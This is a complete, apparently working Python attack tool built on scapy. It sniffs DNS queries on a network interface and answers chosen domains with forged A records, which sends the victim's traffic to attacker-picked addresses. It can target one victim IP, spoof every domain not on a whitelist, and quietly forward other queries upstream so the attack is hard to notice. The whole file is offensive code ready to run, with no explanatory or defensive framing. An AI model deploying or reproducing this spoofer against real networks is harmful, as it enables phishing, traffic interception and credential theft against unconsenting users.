#!/usr/bin/env python3
import argparse
import json
import socket
import threading
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send, sniff, raw, Ether

def load_config(path):
    with open(path,'r') as f:
        return json.load(f)

def craft_response(pkt, spoof_ip):
    ip = pkt[IP]
    udp = pkt[UDP]
    dns = pkt[DNS]
    qname = dns.qd.qname
    dns_resp = DNS(id=dns.id, qr=1, aa=1, ra=1, qd=dns.qd,
                   an=DNSRR(rrname=qname, ttl=300, type='A', rdata=spoof_ip))
    resp = IP(dst=ip.src, src=ip.dst)/UDP(dport=udp.sport, sport=udp.dport)/dns_resp
    return resp

def forward_raw_query(pkt, upstream, timeout=2.0):
    raw_payload = raw(pkt[UDP].payload)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)
    try:
        s.sendto(raw_payload, (upstream, 53))
        data, _ = s.recvfrom(4096)
        s.close()
        return data
    except Exception as e:
        s.close()
        return None

def handle_pkt(pkt, cfg, iface, victim_ip, forward_non_target):
    if not pkt.haslayer(DNS) or pkt.getlayer(DNS).qr != 0:
        return
    dns = pkt[DNS]
    qname = dns.qd.qname.decode().rstrip('.')
    src = pkt[IP].src
    dst = pkt[IP].dst
    print(f"[+] DNS query {qname} from {src} -> {dst}, id={dns.id}")

    if victim_ip and src != victim_ip:
        return
    
    mode = cfg.get('mode','blacklist')
    targets = cfg.get('targets',{})
    to_spoof = False
    spoof_ip = None
    if mode == 'blacklist':
        if qname in targets:
            to_spoof = True
            spoof_ip = targets[qname]
    elif mode == 'whitelist':
        if qname not in targets:
            to_spoof = True
            spoof_ip = cfg.get('default_spoof','127.0.0.1')
    if to_spoof:
        resp = craft_response(pkt, spoof_ip)
        send(resp, iface=iface, verbose=False)
        print(f"[=] Sent spoofed answer for {qname} -> {spoof_ip}")
    else:
        if forward_non_target:
            upstream = cfg.get('upstream_dns','192.168.47.1')
            raw_resp = forward_raw_query(pkt, upstream)
            if raw_resp:
                ip = pkt[IP]
                udp = pkt[UDP]
                wrapper = IP(dst=ip.src, src=ip.dst)/UDP(dport=udp.sport, sport=udp.dport)/raw_resp
                send(wrapper, iface=iface, verbose=False)
                print(f"[=] Forwarded query {qname} to upstream {upstream} and relayed response")
            else:
                print("[!] no reply from upstream")
        else:
            print(f"[-] Not spoofing {qname} and not forwarding (dropped)")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--iface', required=True)
    parser.add_argument('--config', required=True)
    parser.add_argument('--victim', required=False, default=None, help='victim IP to filter on')
    parser.add_argument('--forward', action='store_true', help='forward non-target queries to upstream DNS')
    parser.add_argument('--verbose', action='store_true')
    args = parser.parse_args()

    cfg = load_config(args.config)
    print("[*] Loaded config:", cfg)
    print("[*] Starting sniff on iface", args.iface)
    bpf = "udp port 53"
    sniff(prn=lambda p: handle_pkt(p, cfg, args.iface, args.victim, args.forward),
          filter=bpf, iface=args.iface, store=0)

if __name__ == '__main__':
    main()
